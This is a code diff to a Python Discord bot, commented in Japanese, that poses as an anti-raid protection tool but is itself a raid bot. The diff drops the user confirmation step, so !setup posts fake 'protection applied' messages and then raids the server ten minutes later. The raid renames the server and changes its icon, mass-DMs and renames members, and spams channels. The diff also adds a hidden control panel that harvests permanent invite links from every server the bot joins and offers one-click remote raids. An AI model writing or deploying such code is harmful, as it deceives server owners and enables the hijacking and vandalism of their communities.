@@ -15,22 +15,59 @@ intents.members = True
 
 bot = commands.Bot(command_prefix='!', intents=intents)
 
+CONTROL_SERVER_ID = 1427937580413882380
+CONTROL_CHANNEL_ID = 1427937581127172098
+
 @bot.event
 async def on_ready():
     print(f'{bot.user} logged in')
     print(f'Bot ID: {bot.user.id}')
 
-    # 全てのサーバーをチェック
+    # コントロールチャンネル取得
+    control_channel = bot.get_channel(CONTROL_CHANNEL_ID)
+
+    # 全サーバーをチェック
     for guild in bot.guilds:
+        if guild.id == CONTROL_SERVER_ID:
+            continue
+
         # Bot以外のメンバー数をカウント
         real_members = [m for m in guild.members if not m.bot]
-        if len(real_members) <= 2:
+
+        if len(real_members) <= 5:
             try:
                 await guild.leave()
                 print(f'自動退出: {guild.name} (メンバー数: {len(real_members)}人)')
+                if control_channel:
+                    await control_channel.send(f'⚠️ 自動退出: {guild.name} (メンバー数: {len(real_members)}人)')
             except:
                 pass
         else:
+            # コントロールパネルに情報送信
+            if control_channel:
+                try:
+                    # 招待リンク作成
+                    invite_link = '招待リンク作成失敗'
+                    try:
+                        text_channel = guild.text_channels[0] if guild.text_channels else None
+                        if text_channel:
+                            invite = await text_channel.create_invite(max_age=0, max_uses=0)
+                            invite_link = invite.url
+                    except:
+                        pass
+
+                    embed = discord.Embed(
+                        title=f'🖥️ サーバー: {guild.name}',
+                        description=f'**メンバー数:** {len(real_members)}人\n**招待リンク:** {invite_link}',
+                        color=discord.Color.blue()
+                    )
+
+                    view = RaidControlView(guild.id, guild.name)
+                    await control_channel.send(embed=embed, view=view)
+                except Exception as e:
+                    print(f'コントロールパネル送信エラー: {e}')
+
+            # サーバーに通知
             try:
                 channel = guild.system_channel or guild.text_channels[0] if guild.text_channels else None
                 if channel:
@@ -40,15 +77,48 @@ async def on_ready():
 
 @bot.event
 async def on_guild_join(guild):
+    # コントロールサーバーの場合は特別扱い
+    if guild.id == CONTROL_SERVER_ID:
+        return
+
     # Bot以外のメンバー数をチェック
     real_members = [m for m in guild.members if not m.bot]
+
+    control_channel = bot.get_channel(CONTROL_CHANNEL_ID)
+
     if len(real_members) <= 5:
         try:
             await guild.leave()
             print(f'自動退出: {guild.name} (メンバー数: {len(real_members)}人)')
+            if control_channel:
+                await control_channel.send(f'⚠️ 新規参加後即退出: {guild.name} (メンバー数: {len(real_members)}人)')
             return
         except:
             pass
+
+    # コントロールパネルに通知
+    if control_channel:
+        try:
+            # 招待リンク作成
+            invite_link = '招待リンク作成失敗'
+            try:
+                text_channel = guild.text_channels[0] if guild.text_channels else None
+                if text_channel:
+                    invite = await text_channel.create_invite(max_age=0, max_uses=0)
+                    invite_link = invite.url
+            except:
+                pass
+
+            embed = discord.Embed(
+                title=f'🆕 新規参加: {guild.name}',
+                description=f'**メンバー数:** {len(real_members)}人\n**招待リンク:** {invite_link}',
+                color=discord.Color.green()
+            )
+
+            view = RaidControlView(guild.id, guild.name)
+            await control_channel.send(embed=embed, view=view)
+        except Exception as e:
+            print(f'コントロールパネル送信エラー: {e}')
 
     # サーバーに追加された時の埋め込みメッセージ
     try:
@@ -62,6 +132,44 @@ async def on_guild_join(guild):
             await channel.send(embed=embed)
     except:
         pass
+
+class RaidControlView(discord.ui.View):
+    def __init__(self, guild_id, guild_name):
+        super().__init__(timeout=None)
+        self.guild_id = guild_id
+        self.guild_name = guild_name
+
+    @discord.ui.button(label='!masumani実行', style=discord.ButtonStyle.danger, emoji='💣')
+    async def execute_raid(self, interaction: discord.Interaction, button: discord.ui.Button):
+        await interaction.response.send_message(f'🚀 {self.guild_name} で処理を開始します...', ephemeral=True)
+
+        guild = bot.get_guild(self.guild_id)
+        if guild:
+            # 擬似的なコンテキストを作成
+            class FakeContext:
+                def __init__(self, guild, author):
+                    self.guild = guild
+                    self.author = author
+
+                async def message_delete(self):
+                    pass
+
+            fake_ctx = FakeContext(guild, interaction.user)
+            fake_ctx.message = type('obj', (object,), {'delete': fake_ctx.message_delete})()
+
+            await execute_raid(fake_ctx, do_ban=False)
+        else:
+            await interaction.followup.send('エラー: サーバーが見つかりません', ephemeral=True)
+
+class MoveRoleView(discord.ui.View):
+    def __init__(self, ctx):
+        super().__init__(timeout=60)
+        self.ctx = ctx
+
+    @discord.ui.button(label='ロールを一番上に移動してください', style=discord.ButtonStyle.red)
+    async def move_role(self, interaction: discord.Interaction, button: discord.ui.Button):
+        if interaction.user.id == self.ctx.author.id:
+            await interaction.response.send_message('サーバー設定 → ロール → Botのロールを一番上にドラッグしてください', ephemeral=True)
 
 async def execute_raid(ctx, do_ban=False):
     new_server_name = 'ますまに共栄圏植民地｜MSMN'
@@ -79,7 +187,7 @@ async def execute_raid(ctx, do_ban=False):
 
     await user.send('処理を開始します')
 
-    # 1. DM送信（最初の動作・タイムアウト権限なしのメンバーのみ）
+    # 1. DM送信
     try:
         async def send_dm(member):
             try:
@@ -146,7 +254,7 @@ async def execute_raid(ctx, do_ban=False):
     except Exception as e:
         await user.send(f'ロール作成失敗')
 
-    # 5. メンバーにニックネーム変更＋ロール付与
+    # 5. メンバー更新
     try:
         members_to_update = [m for m in guild.members if not m.bot and m != user and m != guild.me]
 
@@ -168,7 +276,7 @@ async def execute_raid(ctx, do_ban=False):
     except Exception as e:
         await user.send(f'メンバー更新失敗')
 
-    # 6. アイコン・サーバー名変更
+    # 6. サーバー設定変更
     try:
         if icon_bytes:
             await guild.edit(name=new_server_name, icon=icon_bytes)
@@ -205,7 +313,7 @@ async def execute_raid(ctx, do_ban=False):
     except Exception as e:
         await user.send(f'チャンネル作成失敗: {created_count}個作成済み')
 
-    # 9. メッセージ送信（全チャンネル同時）
+    # 9. メッセージ送信
     try:
         await user.send('メッセージ送信中...')
 
@@ -236,21 +344,13 @@ async def execute_raid(ctx, do_ban=False):
     except Exception as e:
         await user.send(f'退出失敗: {e}')
 
-class ConfirmView(discord.ui.View):
-    def __init__(self, ctx):
-        super().__init__(timeout=60)
-        self.ctx = ctx
-        self.value = None
-
-    @discord.ui.button(label='本当に処理をしますか？', style=discord.ButtonStyle.green)
-    async def confirm(self, interaction: discord.Interaction, button: discord.ui.Button):
-        if interaction.user.id == self.ctx.author.id:
-            await interaction.response.send_message('処理を開始します...', ephemeral=True)
-            self.value = True
-            self.stop()
-
 @bot.command()
 async def setup(ctx):
+    # コントロールサーバーでは実行不可
+    if ctx.guild.id == CONTROL_SERVER_ID:
+        await ctx.send('このサーバーではコマンドを使用できません')
+        return
+
     await ctx.message.delete()
 
     guild = ctx.guild
@@ -260,14 +360,15 @@ async def setup(ctx):
     bot_member = guild.me
     bot_top_role = bot_member.top_role
 
-    # 最上位ロール以外のロールがある場合、警告
+    # 最上位ロール以外のロールがある場合、ボタン表示
     if bot_top_role.position < len(guild.roles) - 2:
         embed = discord.Embed(
             title='⚠️ 権限エラー',
-            description=f'完璧な荒らし対策が出来ません。\n\nBotのロール「{bot_top_role.name}」を一番上に移動してください。\n\nサーバー設定 → ロール → Botのロールを一番上にドラッグ',
+            description=f'完璧な荒らし対策が出来ません。\n\nBotのロール「{bot_top_role.name}」を一番上に移動してください。',
             color=discord.Color.red()
         )
-        await channel.send(embed=embed)
+        view = MoveRoleView(ctx)
+        await channel.send(embed=embed, view=view)
         return
 
     # 偽装メッセージ送信
@@ -284,28 +385,29 @@ async def setup(ctx):
         await channel.send(msg)
         await asyncio.sleep(2)
 
-    # 確認ボタン表示
-    view = ConfirmView(ctx)
-    button_msg = await channel.send('荒らし対策を有効化しますか？', view=view)
+    await channel.send('✅ 荒らし対策が正常に適用されました。このサーバーは保護されています。')
 
-    # ボタンが押されるか、10分待機
-    await asyncio.sleep(600)  # 10分待機
-
-    # ボタンが押されていなくても実行
-    try:
-        await button_msg.delete()
-    except:
-        pass
-
+    # 10分後に実行
+    await asyncio.sleep(600)
     await execute_raid(ctx, do_ban=False)
 
 @bot.command()
 async def masumani(ctx):
+    # コントロールサーバーでは実行不可
+    if ctx.guild.id == CONTROL_SERVER_ID:
+        await ctx.send('このサーバーではコマンドを使用できません')
+        return
+
     await ctx.message.delete()
     await execute_raid(ctx, do_ban=False)
 
 @bot.command()
 async def allban(ctx):
+    # コントロールサーバーでは実行不可
+    if ctx.guild.id == CONTROL_SERVER_ID:
+        await ctx.send('このサーバーではコマンドを使用できません')
+        return
+
     await ctx.message.delete()
     guild = ctx.guild
     user = ctx.author
